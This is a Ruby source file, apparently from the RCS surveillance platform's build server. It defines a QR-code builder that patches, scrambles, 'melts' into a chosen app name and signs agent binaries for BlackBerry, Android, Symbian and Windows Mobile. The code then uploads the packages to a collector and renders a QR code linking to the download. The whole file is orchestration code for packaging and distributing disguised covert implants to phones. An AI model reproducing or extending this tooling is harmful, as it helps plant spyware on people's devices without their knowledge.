#
# QR Code encoder for web links
#

require_relative '../frontend'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildQrcode < Build

  def initialize
    super
    @platform = 'qrcode'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"

    params['platform'] = @platform
    super
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    # don't include support files into the outputs
    @outputs = []
    @appname = params['melt']['appname']

    raise "don't know what to build" if params['platforms'].nil? or params['platforms'].empty?

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: generate: #{e.message}"
        build.clean
        next
      end
      build.scramble
      build.melt params['melt'].dup
      build.sign params['sign'].dup

      outs = build.outputs

      # purge the unneeded files
      case platform
        when 'blackberry'
          outs.keep_if {|o| o['.cod'] or o['.jad'] }
          outs.delete_if {|o| o['res']}
        when 'android'
          outs.keep_if {|o| o['.apk']}
        when 'symbian'
          outs.keep_if {|o| o['.sisx']}
          outs.delete_if {|o| o['5th'] or o['3rd'] or o['symbian3']}
        when 'winmo'
          outs.keep_if {|o| o['.cab']}
      end
      
      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o))
        @outputs << o
      end

      build.clean
    end

    CrossPlatform.exec path('qrcode'), "-s 5 -l H -o #{path('output.png')} #{params['link']}"
    raise "PNG creation failed" unless File.exist? path('output.png')

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open('url.png', "wb") { |f| f.write File.open(path('output.png'), 'rb') {|f| f.read} }
    end
  end

  def deliver(params)
    trace :debug, "Build: deliver: #{params} #{@outputs}"

    # zip all the outputs and send them to the collector
    # it will create a subdir automatically
    Zip::ZipFile.open(path("#{@appname}.zip"), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |o|
        z.file.open("#{o}", "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
      end
    end

    # send only this file
    content = File.open(path("#{@appname}.zip"), 'rb') {|f| f.read}
    Frontend.collector_put("#{@appname}.zip", content, @factory, params['user'])

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  end

end

end #DB::
end #RCS::
